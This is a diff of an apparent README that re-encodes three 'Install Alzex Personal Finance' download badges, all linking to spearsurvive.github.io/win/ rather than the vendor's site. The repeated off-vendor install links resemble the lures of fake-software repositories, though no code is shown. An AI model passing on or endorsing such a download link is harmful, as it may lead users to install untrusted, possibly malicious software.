@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install Alzex Personal Finance](https://img.shields.io/badge/⬇_Install_Alzex%20Personal%20Finance-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Alzex Personal Finance](https://img.shields.io/badge/⬇_Install_Alzex+Personal+Finance-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -81,7 +81,7 @@ Alzex Personal Finance is a Windows budget and expense tracking software with a 
 
 <div align="center">
 
-[![⬇ Install Alzex Personal Finance](https://img.shields.io/badge/⬇_Install_Alzex%20Personal%20Finance-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Alzex Personal Finance](https://img.shields.io/badge/⬇_Install_Alzex+Personal+Finance-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -125,7 +125,7 @@ Alzex Personal Finance is a Windows budget and expense tracking software with a 
 
 <div align="center">
 
-[![⬇ Install Alzex Personal Finance](https://img.shields.io/badge/⬇_Install_Alzex%20Personal%20Finance-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Alzex Personal Finance](https://img.shields.io/badge/⬇_Install_Alzex+Personal+Finance-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
